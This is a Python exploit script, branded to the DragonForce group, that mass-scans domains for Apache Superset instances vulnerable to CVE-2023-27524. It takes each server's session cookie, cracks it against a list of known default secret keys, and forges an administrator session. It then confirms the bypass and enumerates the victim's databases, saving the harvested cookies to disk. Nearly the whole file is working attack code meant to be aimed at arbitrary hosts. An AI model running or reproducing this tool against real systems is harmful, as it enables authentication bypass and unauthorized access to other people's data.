# Author: Pari Malam

import requests
import os
import sys
import colorama
import urllib3
import glob
import re
from sys import stdout
from time import sleep
from requests import Request, Session
from flask_unsign import session
from flask_session import Session
from colorama import Fore, init
init(autoreset=True)
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if not os.path.exists('Results'):
    os.mkdir('Results')

os.system('clear' if os.name == 'posix' else 'cls')


def banners():
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   DRAGONFORCE.IO                                "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL TELEGRAM  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   TELEGRAM.ME/DRAGONFORCEIO                     "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{Fore.YELLOW}[CVE-2023-27524] - {Fore.GREEN}Perform With Apache-SuperSet Leaked Token [CSRF]\n")
banners()



SECRET_KEYS = [
    b'\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h',  # version < 1.4.1
    b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',          # version >= 1.4.1
    b'thisISaSECRET_1234',                            # deployment template
    b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',          # documentation
    b'TEST_NON_DEV_SECRET'                            # docker compose
]


def main():
    file_input = input(f'{Fore.RED}[+] - {Fore.YELLOW}IPs/Domain List {Fore.RED}[NON HTTP/S]: {Fore.WHITE}')

    if os.path.isdir(file_input):
        files = glob.glob(file_input + "/*.txt")
        if not files:
            print(f'{Fore.RED}Bro? Whutt are you doin? File not found! {file_input}{Fore.RESET}')
            return
        for file in files:
            with open(file) as f:
                domains = [line.strip() for line in f.readlines()]
            for domain in domains:
                url = f'https://{domain}/login/'
                scan(url)
    else:
        with open(file_input) as f:
            domains = [line.strip() for line in f.readlines()]

        for domain in domains:
            url = f'https://{domain}/login/'
            scan(url)


def scan(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0'
    }
    try:
        resp = requests.get(url, headers=headers, verify=True, timeout=30, allow_redirects=False)
        if resp.status_code != 200:
            print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.RED}Error retrieving login page at {url}, status code: {resp.status_code}{Fore.RESET}')
            return

        session_cookie = None
        for c in resp.cookies:
            if c.name == 'session':
                session_cookie = c.value
                break

        if not session_cookie:
            print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.RED}Error: No session cookie found{Fore.RESET}')
            return

        print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.GREEN}[W00T!] - {Fore.YELLOW}{session_cookie}{Fore.RESET}')
        with open("Results/Cookies.txt", "w") as file:
            file.write(url + '\n' + session_cookie + "\n\n")

        try:
            decoded = session.decode(session_cookie)
            print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.GREEN}[DECODED SESSION!] - {Fore.YELLOW}{decoded}{Fore.RESET}')
        except:
            print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.RED}Error: Not a Flask session cookie{Fore.RESET}')
            return

        match = re.search(r'&#34;version_string&#34;: &#34;(.*?)&#34', resp.text)
        if match:
            version = match.group(1)
        else:
            version = 'Unknown'

        print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.GREEN}Superset Version: {version}{Fore.RESET}')

        for i, k in enumerate(SECRET_KEYS):
            cracked = session.verify(session_cookie, k)
            if cracked:
                break

        if not cracked:
            print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.RED}Failed to crack session cookie{Fore.RESET}')
            return

        forged_cookie = session.sign({'_user_id': '1', 'user_id': '1'}, k)
        print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.RED}Forged session cookie: {forged_cookie}')

        resp = requests.get(url, headers=headers, cookies={'session': forged_cookie}, verify=True, timeout=30, allow_redirects=False)
        if resp.status_code == 302:
            print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.RED}Got 302 on login, forged cookie appears to have been accepted{Fore.RESET}')
        else:
            print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.RED}Got status code {resp.status_code} on login instead of expected redirect 302. Forged cookie does not appear to be valid{Fore.RESET}')
            return

        print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.GREEN}Enumerating databases{Fore.RESET}')
        for i in range(1, 101):
            database_url_base = url.rstrip('/') + '/api/v1/database'
            try:
                r = requests.get(f'{database_url_base}/{i}', headers=headers, cookies={'session': forged_cookie}, verify=True, timeout=30, allow_redirects=True)
                if r.status_code == 200:
                    result = r.json()['result']
                    name = result['database_name']
                    print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.GREEN}Found database {name}')
                elif r.status_code == 404:
                    print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.GREEN}Done enumerating databases{Fore.RESET}')
                    break
                else:
                    print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.RED}Unexpected error: status code={r.status_code}{Fore.RESET}')
                    break
            except Exception as e_inner:
                print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.RED}Unexpected error: {e_inner}{Fore.RESET}')
                break

    except Exception as e:
        print(f'{Fore.YELLOW}[CVE-2023-27524] - {Fore.RED}Unexpected error: {e}{Fore.RESET}')


if __name__ == '__main__':
    main()